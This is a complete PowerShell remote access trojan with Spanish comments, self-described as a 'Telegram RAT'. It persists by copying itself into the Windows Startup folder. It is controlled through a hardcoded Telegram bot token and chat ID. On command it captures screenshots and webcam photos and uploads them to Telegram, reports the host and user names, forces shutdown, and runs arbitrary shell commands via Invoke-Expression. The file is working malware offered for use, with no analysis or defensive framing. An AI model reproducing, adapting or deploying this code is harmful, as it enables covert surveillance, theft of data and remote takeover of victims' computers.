# ============================
# agent.ps1 - Telegram RAT
# ============================

# Configuración del bot
$token = "7764443259:AAHsLJJNFKcQ0Mr1sTXXCdsVZxJpuWG0FKk"
$chatid = "1717601274"
$api = "https://api.telegram.org/bot$token"

# Persistencia
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\agent.ps1"
if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
}

# Funciones
function SendMessage($text) {
    $uri = "$api/sendMessage"
    Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chatid; text=$text}
}

function SendPhoto($filePath) {
    $uri = "$api/sendPhoto"
    Invoke-RestMethod -Uri $uri -Method Post -Form @{chat_id=$chatid; photo=Get-Item $filePath}
}

function TakeScreenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $file = "$env:TEMP\screenshot.png"
    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $file
}

function TakeCamera {
    $file = "$env:TEMP\camera.jpg"
    $ffmpeg = "ffmpeg"
    try {
        Start-Process -FilePath $ffmpeg -ArgumentList "-f dshow -i video=""Integrated Camera"" -frames:v 1 -y $file" -NoNewWindow -Wait
        if (Test-Path $file) {
            return $file
        } else {
            SendMessage "⚠️ No se pudo capturar la cámara."
            return $null
        }
    } catch {
        SendMessage "❌ Error al capturar cámara: $_"
        return $null
    }
}

function ExecuteShell($cmd) {
    try {
        $output = Invoke-Expression $cmd 2>&1
    } catch {
        $output = $_.Exception.Message
    }
    return $output
}

# Mensaje inicial
SendMessage "🤖 Bot conectado.
Comandos disponibles:
/help - Muestra esta ayuda
/status - Estado actual
/screenshot - Captura de pantalla
/camera - Foto de la cámara
/shutdown - Apagar PC
/shell comando - Ejecutar un comando en la PC"

# Loop principal
$offset = 0
while ($true) {
    $updates = Invoke-RestMethod "$api/getUpdates?offset=$offset&timeout=10"
    foreach ($update in $updates.result) {
        $offset = $update.update_id + 1
        $text = $update.message.text
        $from = $update.message.chat.id

        if ($from -ne $chatid) { continue }

        if ($text -eq "/help") {
            SendMessage "Comandos:
/start - Inicia el bot
/help - Ayuda
/status - Estado actual
/screenshot - Captura de pantalla
/camera - Foto de la cámara
/shutdown - Apagar PC
/shell comando - Ejecuta un comando"
        }
        elseif ($text -eq "/start") {
            SendMessage "✅ Bot iniciado. Escribe /help para ver comandos."
        }
        elseif ($text -eq "/status") {
            $hostname = $env:COMPUTERNAME
            $user = $env:USERNAME
            SendMessage "💻 Equipo: $hostname`n👤 Usuario: $user"
        }
        elseif ($text -eq "/screenshot") {
            $file = TakeScreenshot
            SendPhoto $file
        }
        elseif ($text -eq "/camera") {
            $file = TakeCamera
            if ($file) {
                SendPhoto $file
            }
        }
        elseif ($text -eq "/shutdown") {
            SendMessage "⚠️ Apagando equipo..."
            Stop-Computer -Force
        }
        elseif ($text -like "/shell*") {
            $cmd = $text.Substring(7)
            $out = ExecuteShell $cmd
            if ($out.Length -gt 4000) {
                $out = $out.Substring(0, 4000) + "`n[...truncado]"
            }
            SendMessage "📨 Resultado:`n$out"
        }
        else {
            SendMessage "❌ Comando no reconocido: $text"
        }
    }
    Start-Sleep -Seconds 3
}
